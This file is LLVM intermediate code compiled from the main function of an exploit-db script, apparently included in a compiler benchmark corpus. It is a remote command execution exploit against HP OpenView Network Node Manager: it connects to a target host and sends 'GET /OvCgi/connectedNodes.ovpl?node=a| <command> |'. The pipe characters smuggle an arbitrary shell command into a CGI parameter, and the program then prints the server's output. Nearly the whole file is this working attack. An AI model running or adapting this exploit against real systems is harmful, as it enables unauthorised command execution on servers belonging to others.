; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/remote/extr_1188.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/remote/extr_1188.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.main.evil_request = private unnamed_addr constant [40 x i8] c"GET /OvCgi/connectedNodes.ovpl?node=a| \00", align 16
@__const.main.evil_request2 = private unnamed_addr constant [3 x i8] c" |\00", align 1
@SIZE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [53 x i8] c"\0A +[ HP OV NNM Remote Command Execution ]+ by Lympex\00", align 1
@.str.1 = private unnamed_addr constant [55 x i8] c"\0AContact: lympex[at]gmail[dot]com & http://l-bytes.net\00", align 1
@.str.2 = private unnamed_addr constant [56 x i8] c"\0A-----------------------------------------------------\0A\00", align 1
@.str.3 = private unnamed_addr constant [32 x i8] c"\0A[+] Usage: %s <host> <command>\00", align 1
@.str.4 = private unnamed_addr constant [46 x i8] c"\0AImportant: Do not include \22<\22 and \22>\22 chars\0A\00", align 1
@.str.5 = private unnamed_addr constant [53 x i8] c"\0A[!] Error - You have included \22<\22 and/or \22>\22 chars\0A\00", align 1
@.str.6 = private unnamed_addr constant [26 x i8] c"\0A[+] Connecting  %s:%d...\00", align 1
@Port = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [7 x i8] c"Error\0A\00", align 1
@.str.8 = private unnamed_addr constant [3 x i8] c"OK\00", align 1
@.str.9 = private unnamed_addr constant [3 x i8] c"\0A\0A\00", align 1
@.str.10 = private unnamed_addr constant [58 x i8] c"\0A\0A------- [Result] -------\0A\0A%s\0A------- [/Result] -------\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca [40 x i8], align 16
  %8 = alloca [3 x i8], align 1
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  %11 = alloca i64, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %14 = bitcast [40 x i8]* %7 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %14, i8* align 16 getelementptr inbounds ([40 x i8], [40 x i8]* @__const.main.evil_request, i32 0, i32 0), i64 40, i1 false)
  %15 = bitcast [3 x i8]* %8 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %15, i8* align 1 getelementptr inbounds ([3 x i8], [3 x i8]* @__const.main.evil_request2, i32 0, i32 0), i64 3, i1 false)
  %16 = load i32, i32* @SIZE, align 4
  %17 = zext i32 %16 to i64
  %18 = call i8* @llvm.stacksave()
  store i8* %18, i8** %10, align 8
  %19 = alloca i8, i64 %17, align 16
  store i64 %17, i64* %11, align 8
  %20 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str, i64 0, i64 0))
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.1, i64 0, i64 0))
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.2, i64 0, i64 0))
  %23 = load i32, i32* %4, align 4
  %24 = icmp ne i32 %23, 3
  br i1 %24, label %25, label %31

25:                                               ; preds = %2
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 0
  %28 = load i8*, i8** %27, align 8
  %29 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.3, i64 0, i64 0), i8* %28)
  %30 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.4, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  store i32 1, i32* %13, align 4
  br label %120

31:                                               ; preds = %2
  store i32 0, i32* %12, align 4
  br label %32

32:                                               ; preds = %62, %31
  %33 = load i32, i32* %12, align 4
  %34 = load i8**, i8*** %5, align 8
  %35 = getelementptr inbounds i8*, i8** %34, i64 2
  %36 = load i8*, i8** %35, align 8
  %37 = call i32 @strlen(i8* %36)
  %38 = icmp ult i32 %33, %37
  br i1 %38, label %39, label %65

39:                                               ; preds = %32
  %40 = load i8**, i8*** %5, align 8
  %41 = getelementptr inbounds i8*, i8** %40, i64 2
  %42 = load i8*, i8** %41, align 8
  %43 = load i32, i32* %12, align 4
  %44 = zext i32 %43 to i64
  %45 = getelementptr inbounds i8, i8* %42, i64 %44
  %46 = load i8, i8* %45, align 1
  %47 = sext i8 %46 to i32
  %48 = icmp eq i32 %47, 60
  br i1 %48, label %59, label %49

49:                                               ; preds = %39
  %50 = load i8**, i8*** %5, align 8
  %51 = getelementptr inbounds i8*, i8** %50, i64 2
  %52 = load i8*, i8** %51, align 8
  %53 = load i32, i32* %12, align 4
  %54 = zext i32 %53 to i64
  %55 = getelementptr inbounds i8, i8* %52, i64 %54
  %56 = load i8, i8* %55, align 1
  %57 = sext i8 %56 to i32
  %58 = icmp eq i32 %57, 62
  br i1 %58, label %59, label %61

59:                                               ; preds = %49, %39
  %60 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.5, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  store i32 1, i32* %13, align 4
  br label %120

61:                                               ; preds = %49
  br label %62

62:                                               ; preds = %61
  %63 = load i32, i32* %12, align 4
  %64 = add i32 %63, 1
  store i32 %64, i32* %12, align 4
  br label %32

65:                                               ; preds = %32
  %66 = load i8**, i8*** %5, align 8
  %67 = getelementptr inbounds i8*, i8** %66, i64 1
  %68 = load i8*, i8** %67, align 8
  %69 = load i32, i32* @Port, align 4
  %70 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.6, i64 0, i64 0), i8* %68, i32 %69)
  %71 = load i8**, i8*** %5, align 8
  %72 = getelementptr inbounds i8*, i8** %71, i64 1
  %73 = load i8*, i8** %72, align 8
  %74 = load i32, i32* @Port, align 4
  %75 = call i32 @Conecta(i8* %73, i32 %74)
  store i32 %75, i32* %6, align 4
  %76 = load i32, i32* %6, align 4
  %77 = icmp eq i32 %76, -1
  br i1 %77, label %78, label %80

78:                                               ; preds = %65
  %79 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.7, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  store i32 1, i32* %13, align 4
  br label %120

80:                                               ; preds = %65
  %81 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.8, i64 0, i64 0))
  %82 = load i8**, i8*** %5, align 8
  %83 = getelementptr inbounds i8*, i8** %82, i64 2
  %84 = load i8*, i8** %83, align 8
  %85 = call i32 @strlen(i8* %84)
  %86 = add i32 %85, 24
  %87 = add i32 %86, 12
  %88 = zext i32 %87 to i64
  %89 = mul i64 %88, 1
  %90 = trunc i64 %89 to i32
  %91 = call i64 @malloc(i32 %90)
  %92 = inttoptr i64 %91 to i8*
  store i8* %92, i8** %9, align 8
  %93 = load i8*, i8** %9, align 8
  %94 = getelementptr inbounds [40 x i8], [40 x i8]* %7, i64 0, i64 0
  %95 = call i32 @strcpy(i8* %93, i8* %94)
  %96 = load i8*, i8** %9, align 8
  %97 = load i8**, i8*** %5, align 8
  %98 = getelementptr inbounds i8*, i8** %97, i64 2
  %99 = load i8*, i8** %98, align 8
  %100 = call i32 @strcat(i8* %96, i8* %99)
  %101 = load i8*, i8** %9, align 8
  %102 = getelementptr inbounds [3 x i8], [3 x i8]* %8, i64 0, i64 0
  %103 = call i32 @strcat(i8* %101, i8* %102)
  %104 = load i8*, i8** %9, align 8
  %105 = call i32 @strcat(i8* %104, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.9, i64 0, i64 0))
  %106 = load i32, i32* %6, align 4
  %107 = load i8*, i8** %9, align 8
  %108 = load i8*, i8** %9, align 8
  %109 = call i32 @strlen(i8* %108)
  %110 = call i32 @send(i32 %106, i8* %107, i32 %109, i32 0)
  %111 = load i32, i32* %6, align 4
  %112 = load i32, i32* @SIZE, align 4
  %113 = call i64 @recv(i32 %111, i8* %19, i32 %112, i32 0)
  %114 = getelementptr inbounds i8, i8* %19, i64 %113
  store i8 0, i8* %114, align 1
  %115 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.10, i64 0, i64 0), i8* %19)
  %116 = call i32 (...) @WSACleanup()
  %117 = call i32 @LocalFree(i8* %19)
  %118 = load i8*, i8** %9, align 8
  %119 = call i32 @LocalFree(i8* %118)
  store i32 0, i32* %3, align 4
  store i32 1, i32* %13, align 4
  br label %120

120:                                              ; preds = %80, %78, %59, %25
  %121 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %121)
  %122 = load i32, i32* %3, align 4
  ret i32 %122
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #2

declare dso_local i32 @printf(i8*, ...) #3

declare dso_local i32 @strlen(i8*) #3

declare dso_local i32 @Conecta(i8*, i32) #3

declare dso_local i64 @malloc(i32) #3

declare dso_local i32 @strcpy(i8*, i8*) #3

declare dso_local i32 @strcat(i8*, i8*) #3

declare dso_local i32 @send(i32, i8*, i32, i32) #3

declare dso_local i64 @recv(i32, i8*, i32, i32) #3

declare dso_local i32 @WSACleanup(...) #3

declare dso_local i32 @LocalFree(i8*) #3

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { nounwind }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
